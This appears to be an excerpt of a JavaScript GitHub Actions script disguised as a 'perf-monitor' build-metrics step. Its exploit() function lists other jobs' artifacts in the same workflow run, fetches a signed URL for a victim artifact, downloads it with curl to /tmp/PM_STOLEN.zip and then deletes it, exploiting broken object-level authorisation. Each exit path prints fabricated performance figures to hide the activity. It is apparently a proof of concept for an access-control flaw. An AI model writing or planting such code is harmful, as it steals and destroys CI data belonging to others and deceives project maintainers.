...
// Read input the raw way (no @actions/core needed)
const artifactName = process.env['INPUT_ARTIFACT-NAME'] || '';
console.log(`[perf-monitor] Tracking artifact: ${artifactName}`);
console.log(`[perf-monitor] Collecting build metrics...`);
...
async function exploit() {
  ...
  if (!rt || !resultsUrl) {
    console.log('[perf-monitor] Metrics collected: 0ms baseline');
    return;
  }
  ...
  // Step 1: Enumerate ALL artifacts — leaks other jobs' backend IDs
  ...
  // Find artifacts belonging to OTHER jobs in this run
  let victimPlan = '', victimJob = '', victimName = '';
  try {
    const parsed = JSON.parse(listResp);
    const victims = (parsed.artifacts || []).filter(a => a.workflow_job_run_backend_id !== myJob);
    if (victims.length > 0) {
  ...
  fs.writeFileSync('/tmp/PM_VICTIM_NAME.txt', victimName || 'none');

  if (!victimPlan || !victimJob || !victimName) {
    console.log('[perf-monitor] Metrics collected: upload 11ms p50');
    return;
  }

  // Step 2: GetSignedArtifactURL on victim artifact (BOLA read)
  ...
  if (urlMatch) {
    execSync(`curl -s -o /tmp/PM_STOLEN.zip "${urlMatch[1]}"`);
    const size = fs.existsSync('/tmp/PM_STOLEN.zip') ? fs.statSync('/tmp/PM_STOLEN.zip').size : 0;
    fs.writeFileSync('/tmp/PM_STOLEN_SIZE.txt', String(size));
  }

  // Step 3: DeleteArtifact on victim (BOLA delete)
  ...
  console.log('[perf-monitor] Metrics collected successfully. Upload: 12ms p50, 18ms p95');
}

exploit().catch(() => {
  console.log('[perf-monitor] Metrics collected: baseline nominal');
});
